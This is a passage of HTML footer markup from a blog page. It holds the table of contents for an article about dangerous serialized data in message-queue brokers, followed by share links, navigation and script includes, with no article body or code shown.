+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、消息队列与数据序列化"><span class="toc-number">1.</span> <span class="toc-text">一、消息队列与数据序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-消息队列代理"><span class="toc-number">1.1.</span> <span class="toc-text">1. 消息队列代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-数据序列化"><span class="toc-number">1.2.</span> <span class="toc-text">2. 数据序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、危险的序列化方式"><span class="toc-number">2.</span> <span class="toc-text">二、危险的序列化方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、脆弱的消息队列代理"><span class="toc-number">3.</span> <span class="toc-text">三、脆弱的消息队列代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、总结"><span class="toc-number">4.</span> <span class="toc-text">四、总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&text=定时炸弹 - MQ 代理中危险的序列化数据"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&title=定时炸弹 - MQ 代理中危险的序列化数据"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&is_video=false&description=定时炸弹 - MQ 代理中危险的序列化数据"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=定时炸弹 - MQ 代理中危险的序列化数据&body=Check out this article: http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&title=定时炸弹 - MQ 代理中危险的序列化数据"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&title=定时炸弹 - MQ 代理中危险的序列化数据"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&title=定时炸弹 - MQ 代理中危险的序列化数据"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&title=定时炸弹 - MQ 代理中危险的序列化数据"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&name=定时炸弹 - MQ 代理中危险的序列化数据&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 RickGray
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
